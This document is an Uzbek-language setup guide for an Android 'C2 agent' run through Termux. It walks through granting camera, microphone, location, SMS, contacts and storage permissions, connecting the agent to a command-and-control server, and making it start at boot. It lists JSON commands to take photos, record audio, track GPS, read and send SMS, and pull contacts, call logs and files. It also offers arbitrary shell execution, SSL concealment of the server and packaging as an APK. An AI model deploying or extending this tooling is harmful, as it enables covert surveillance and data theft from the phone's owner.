# 📱 Android Agent Setup Guide

## Telefonda C2 Agent O'rnatish

### 1️⃣ Termux O'rnatish

**Play Store'dan yuklab oling:**
- Termux (Terminal Emulator for Android)
- Termux:API (Android API Access)

**Yoki F-Droid'dan:**
- https://f-droid.org/packages/com.termux/
- https://f-droid.org/packages/com.termux.api/

---

### 2️⃣ Termux'da Python va Paketlar O'rnatish

```bash
# Paketlarni yangilash
pkg update && pkg upgrade -y

# Python o'rnatish
pkg install python -y

# Git o'rnatish
pkg install git -y

# Termux:API o'rnatish
pkg install termux-api -y

# Python paketlar
pip install --upgrade pip
```

---

### 3️⃣ Mobile Agent Yuklab Olish

```bash
# Repository clone qilish
git clone https://github.com/YOUR_USERNAME/c2.git
cd c2/agent

# Agent konfiguratsiya
nano mobile_agent.py
```

**SERVER_HOST o'zgartiring:**
```python
SERVER_HOST = "YOUR_C2_SERVER_IP"  # C2 server IP
SERVER_PORT = 9999
```

---

### 4️⃣ Ruxsatlar Berish

**Termux:API ruxsatlari:**

Telefonning Settings → Apps → Termux:API → Permissions:
- ✅ Camera
- ✅ Microphone
- ✅ Location
- ✅ Contacts
- ✅ SMS
- ✅ Phone
- ✅ Storage

**Termux storage access:**
```bash
termux-setup-storage
```

---

### 5️⃣ Agent Ishga Tushirish

```bash
cd c2/agent
python mobile_agent.py
```

**Background'da ishga tushirish:**
```bash
# Termux:Boot orqali avtomatik ishga tushirish
pkg install termux-boot -y
mkdir -p ~/.termux/boot
echo "cd c2/agent && python mobile_agent.py" > ~/.termux/boot/start-agent.sh
chmod +x ~/.termux/boot/start-agent.sh
```

---

## 📋 Qo'llab-quvvatlanadigan Funksiyalar

### 📸 Kamera
```json
{
    "type": "CAMERA_PHOTO",
    "camera": "back"  // yoki "front"
}
```

```json
{
    "type": "CAMERA_VIDEO",
    "duration": 10  // soniya
}
```

### 🎤 Mikrofon
```json
{
    "type": "RECORD_AUDIO",
    "duration": 10  // soniya
}
```

### 🖼️ Screenshot
```json
{
    "type": "SCREENSHOT"
}
```

### 📍 GPS Joylashuv
```json
{
    "type": "GET_GPS"
}
```

### 💬 SMS
**SMS o'qish:**
```json
{
    "type": "GET_SMS"
}
```

**SMS yuborish:**
```json
{
    "type": "SEND_SMS",
    "number": "+998901234567",
    "message": "Test message"
}
```

### 👥 Kontaktlar
```json
{
    "type": "GET_CONTACTS"
}
```

### 📞 Qo'ng'iroq Tarixi
```json
{
    "type": "GET_CALL_LOG"
}
```

### 📂 Fayllar
**Ro'yxat:**
```json
{
    "type": "LIST_FILES",
    "path": "/sdcard/Download"
}
```

**Yuklab olish:**
```json
{
    "type": "DOWNLOAD_FILE",
    "filepath": "/sdcard/document.pdf"
}
```

**Yuklash:**
```json
{
    "type": "UPLOAD_FILE",
    "filepath": "/sdcard/uploaded.txt",
    "content": "base64_encoded_data"
}
```

### 💻 Shell Komandalar
```json
{
    "type": "SHELL",
    "command": "ls -la /sdcard"
}
```

### 📳 Vibratsiya
```json
{
    "type": "VIBRATE",
    "duration": 1000  // milliseconds
}
```

---

## 🔒 Xavfsizlik

### C2 Server SSL Orqali

**Nginx Reverse Proxy:**
```nginx
server {
    listen 443 ssl;
    server_name your-domain.com;
    
    ssl_certificate /etc/letsencrypt/live/your-domain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/your-domain.com/privkey.pem;
    
    location / {
        proxy_pass http://127.0.0.1:9999;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

**Agent konfiguratsiya (HTTPS):**
```python
SERVER_HOST = "your-domain.com"
SERVER_PORT = 443
USE_SSL = True
```

---

## 🚀 APK Yaratish (Advanced)

### Buildozer orqali

```bash
# PC'da buildozer o'rnatish
pip install buildozer

# buildozer.spec yaratish
buildozer init

# APK build
buildozer android debug

# APK joylashuvi
# bin/yourapp-0.1-debug.apk
```

### Kivy orqali GUI Agent

```python
from kivy.app import App
from kivy.uix.label import Label

class MobileAgentApp(App):
    def build(self):
        return Label(text='C2 Agent Running...')

if __name__ == '__main__':
    MobileAgentApp().run()
```

---

## 🛠️ Troubleshooting

### Termux:API ishlamasa:
```bash
# Qayta o'rnatish
pkg uninstall termux-api
pkg install termux-api

# Test qilish
termux-camera-info
termux-location
```

### Ruxsatlar berilmagan:
```bash
# Settings → Apps → Termux:API → Permissions
# Barcha ruxsatlarni yoqing
```

### Network Error:
```bash
# Firewall tekshirish
# C2 server'da port ochiq ekanligini tekshiring
netstat -tuln | grep 9999
```

---

## 📊 Performance

**Batareya:**
- Background service minimalkan CPU ishlatadi
- Interval: 100ms check cycle
- Idle mode'da batareya tejaydi

**Traffic:**
- JSON format - kichik data
- Base64 encoding fayllar uchun
- Compression qo'shish mumkin

**Stability:**
- Auto-reconnect on disconnect
- Error handling har bir funksiyada
- Crash recovery

---

## 🎯 Next Steps

1. ✅ Termux + Termux:API o'rnatish
2. ✅ Python va paketlar setup
3. ✅ Agent konfiguratsiya (server IP)
4. ✅ Ruxsatlar berish
5. ✅ Agent ishga tushirish
6. ✅ C2 GUI'dan test qilish

**Barcha funksiyalar ishga tayyor! 🚀**
